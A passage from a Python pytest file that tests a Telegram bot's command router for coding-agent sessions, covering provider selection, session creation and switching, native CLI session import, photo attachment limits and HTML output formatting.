            if self._abort_current:
                self._abort_current = False
                return AgentRunResult(
                    session_id=session_id,
                    success=False,
                    assistant_text="",
                    error_message=None,
                    raw_events=[],
                    error_code="agent_aborted",
                )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


def test_new_command_supports_copilot_provider(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))
    state = store.get_chat_state("bot-a", 123)
    sess = state["sessions"][state["active_session_id"]]
    assert sess["provider"] == "copilot"
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_skips_git_repo_check_for_trusted_project(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.trust_project("backend")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls[-1]["skip_git_repo_check"] is True
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_rejects_duplicate_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_existing", "my-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert "Session name already exists: my-session" in bot.messages[-1][1]


def test_new_command_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert any("Replacement session creation appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_new_command_prompts_for_provider_when_not_selected(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert "Provider selection is required" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None
    assert store.get_chat_state("bot-a", 123)["pending_action"]["kind"] == "new_session"


def test_new_without_name_uses_new_session_as_default_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="/new")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_new(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "sess_abc123"
    assert "Session created successfully: sess_abc123" in bot.messages[-1][1]
    assert runner.create_calls[-1]["user_message"] == "Create session: new session"


def test_new_without_name_ignores_existing_new_session_labels(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_existing", "new session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="/new")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_new(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "sess_abc123"
    assert "Session created successfully: sess_abc123" in bot.messages[-1][1]


def test_provider_command_sends_inline_buttons(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: provider == "copilot"

    update = make_update(text="/provider")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_provider(update, context))

    assert len(bot.messages) == 1
    message = bot.messages[0]
    assert "Current provider: copilot" in message[1]
    keyboard = message[3]
    assert keyboard is not None
    buttons = keyboard.inline_keyboard[0]
    assert buttons[0].callback_data == "provider:set:codex"
    assert buttons[1].callback_data == "provider:set:copilot"
    assert "missing" in buttons[0].text
    assert "current" in buttons[1].text


def test_provider_callback_updates_current_provider(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    answers = []
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert answers == ["answered"]
    assert edited == ["Current provider set to: copilot"]
    assert store.get_chat_state("bot-a", 123)["current_provider"] == "copilot"


def test_provider_callback_continues_pending_new_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"kind": "new_session", "session_name": "my-session"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert edited == ["Current provider set to: copilot"]
    assert runner.create_calls[-1]["provider"] == "copilot"
    state = store.get_chat_state("bot-a", 123)
    assert "pending_action" not in state
    assert state["sessions"][state["active_session_id"]]["provider"] == "copilot"


def test_provider_switch_auto_creates_session_named_by_session_id(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert edited == ["Current provider set to: copilot"]
    assert state["sessions"][state["active_session_id"]]["name"] == "sess_abc123"
    assert state["sessions"][state["active_session_id"]]["provider"] == "copilot"


def test_provider_availability_uses_cache(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    calls = []

    def fake_which(_name):
        calls.append(_name)
        return "/usr/local/bin/codex"

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", fake_which)

    assert router._provider_available("codex") is True
    assert router._provider_available("codex") is True
    assert calls == [cfg.codex_bin]


def test_missing_provider_availability_cache_expires_faster(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    calls = []

    def fake_which(_name):
        calls.append(_name)
        return None if len(calls) == 1 else "/usr/local/bin/copilot"

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", fake_which)

    assert router._provider_available("copilot") is False
    cached_at, available, bin_name = router._provider_availability_cache["copilot"]
    router._provider_availability_cache["copilot"] = (
        cached_at - router.PROVIDER_BIN_MISSING_CACHE_TTL_SECONDS - 1,
        available,
        bin_name,
    )

    assert router._provider_available("copilot") is True
    assert calls == [cfg.copilot_bin, cfg.copilot_bin]


def test_switch_lists_latest_10_sessions_by_default(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 1/3):" in message
    assert "🤖 = Bot managed session" in message
    assert "session-9" in message
    assert "session-7" in message
    assert "session-6" not in message
    assert "session-4" not in message
    assert "Pages: /switch page 1 ... /switch page 3" in message
    assert "/switch &lt;session_id&gt;" in message


def test_switch_lists_requested_page(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "2"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 2/3):" in message
    assert "session-4" in message
    assert "session-2" in message
    assert "session-9" not in message


def test_switch_lists_mixed_bot_and_native_project_sessions_with_legend(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_bot", "bot-session", "backend", "codex", branch_name="feature-1")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    seed_copilot_native_session(
        home,
        session_id="sess_native_copilot",
        branch="enhancement",
        created_at="2026-03-27T01:00:00Z",
        updated_at="2026-03-27T02:00:00Z",
        summary="Native copilot review",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "🤖 = Bot managed session" in message
    assert "💻 = native CLI session" in message
    assert "Current project filter for native sessions: <code>backend</code>" in message
    assert "🤖 bot-session" in message
    assert "💻 Native codex review" in message
    assert "initialized: Native codex review" in message


def test_switch_lists_only_current_provider_native_sessions(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    seed_copilot_native_session(
        home,
        session_id="sess_native_copilot",
        branch="enhancement",
        created_at="2026-03-27T01:00:00Z",
        updated_at="2026-03-27T02:00:00Z",
        summary="Native copilot review",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 Native copilot review" in message
    assert "initialized: Native copilot review" in message
    assert "💻 Native codex review" not in message


def test_switch_uses_human_fallback_for_copilot_session_without_summary(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_copilot_native_session(
        home,
        session_id="a3293772-2567-42a4-af26-bf61f0e33792",
        branch="enhancement",
        created_at="2026-03-26T16:56:05.485Z",
        updated_at="2026-03-26T16:56:05.542Z",
        summary="",
        with_events=False,
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 Copilot session on enhancement" in message
    assert "initialized: Copilot session on enhancement" in message
    assert "💻 a3293772-2567-42a4-af26-bf61f0e33792" not in message


def test_switch_discovers_native_copilot_session_from_home_store(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_copilot_native_session(
        home,
        session_id="83d5cd02-0022-4b02-9ad0-47594ebe05ea",
        branch="feature-enhancements",
        created_at="2026-03-27T21:31:57.142Z",
        updated_at="2026-03-27T21:32:08.193Z",
        summary="pls scan the code quality",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 pls scan the code quality" in message
    assert "initialized: pls scan the code quality" in message


def test_switch_by_session_id_still_works(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Switched to session: session-a" in bot.messages[-1][1]


def test_switch_imports_native_session_into_state_json(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="/switch sess_native_codex")
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_native_codex"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_native_codex"
    assert state["sessions"]["sess_native_codex"]["name"] == "Native codex review"
    assert "Source: native CLI session" in bot.messages[-1][1]
    assert "Imported into state.json." in bot.messages[-1][1]


def test_current_requires_active_session(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert "No active session." in bot.messages[-1][1]


def test_current_reports_active_session_details(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    message = bot.messages[-1][1]
    assert "Current session: session-a" in message
    assert "Project: backend" in message
    assert "Provider: codex" in message
    assert "Branch: feature-1" in message


def test_switch_does_not_checkout_branch_immediately(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="missing-branch")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        checkout_result=SimpleNamespace(success=False, message="Failed to checkout branch: missing-branch"),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Switched to session: session-a" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_a"
    assert router.git.current_branch(backend) == "main"


def test_switch_rejects_missing_project_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "deleted-project", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Project folder no longer exists for this session: deleted-project" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_b"


def test_send_text_uses_html_parse_mode(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][2] == "HTML"


def test_photo_message_is_saved_and_forwarded_to_codex(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="what is shown here?"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls
    image_paths = runner.resume_calls[-1]["image_paths"]
    assert len(image_paths) == 1
    assert image_paths[0].is_file()
    assert "/.coding-agent-telegram/telegram_attachments/backend/" in image_paths[0].as_posix()
    assert runner.resume_calls[-1]["user_message"].startswith("An image is attached at ../.coding-agent-telegram/telegram_attachments/backend/")
    assert "Open and inspect that image before answering." in runner.resume_calls[-1]["user_message"]
    assert "what is shown here?" in runner.resume_calls[-1]["user_message"]


def test_photo_message_rejected_for_copilot_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert "Photo attachments are currently supported only for codex sessions." in bot.messages[-1][1]


def test_photo_message_rejected_when_declared_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(
        FakeTelegramFile(b"small-content", "photos/pic.png"),
        file_size=(5 * 1024 * 1024) + 1,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_photo_message_rejected_when_downloaded_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    oversized = b"x" * ((5 * 1024 * 1024) + 1)
    photo = FakePhotoSize(FakeTelegramFile(oversized, "photos/pic.png"), file_size=1024)
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_photo_message_reports_missing_project_folder_before_storing_attachment(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    backend.rmdir()

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


def test_assistant_output_is_rendered_as_html_not_raw_markdown(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = MarkdownRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    codex_message = bot.messages[1]
    assert codex_message[2] == "HTML"
    assert "[agent_runner.py](" not in codex_message[1]
    assert "<code>agent_runner.py</code>" in codex_message[1]
    assert "<code>config.py</code>" in codex_message[1]


def test_copilot_output_uses_copilot_label(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = MarkdownRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any("Copilot output" in message[1] for message in bot.messages)


def test_message_reports_missing_project_folder_before_running_agent(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    backend.rmdir()

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Project folder does not exist: backend\nRun /project backend again."


def test_message_prompts_for_provider_when_not_selected(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert "Provider selection is required" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None
    assert store.get_chat_state("bot-a", 123)["pending_action"]["kind"] == "message"


